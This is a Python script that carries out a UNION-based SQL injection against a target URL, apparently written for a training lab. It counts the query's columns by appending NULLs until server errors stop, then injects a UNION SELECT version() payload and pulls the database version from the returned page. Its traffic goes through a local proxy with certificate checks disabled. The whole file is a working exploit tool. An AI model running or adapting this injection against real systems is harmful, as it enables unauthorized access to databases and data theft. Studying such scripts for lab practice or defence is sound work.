import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def get_database_version(url, numCols):
    if numCols == 2:
        payload = "' UNION SELECT version(), NULL%23"
        r = requests.get(url + payload, verify=False, proxies=proxies)
        res = r.text
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(string=re.compile(r".*\d{1,2}\.\d{1,2}\.\d{1,2}.*"))
        if version is None:
            return False
        else:
            return version


def exploit_sqli(url):
    counter = 1
    payload = "NULL"
    end = "%23"
    r = requests.get(url + "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
    while "Internal Server Error" in r.text:
        payload += ",NULL"
        r = requests.get(url+ "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
        counter += 1
    return counter


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://target.com/")
        sys.exit(-1)

    url = sys.argv[1]
    numCols = exploit_sqli(url)
    print(f'(+) Number of returned columns: {numCols}')
    dbVersion = get_database_version(url, numCols)
    if dbVersion:
        print("(+) Database version dumped: ", dbVersion)
    else:
        print("(-) Unable to dump the database version")
    

if __name__ == "__main__":
    main()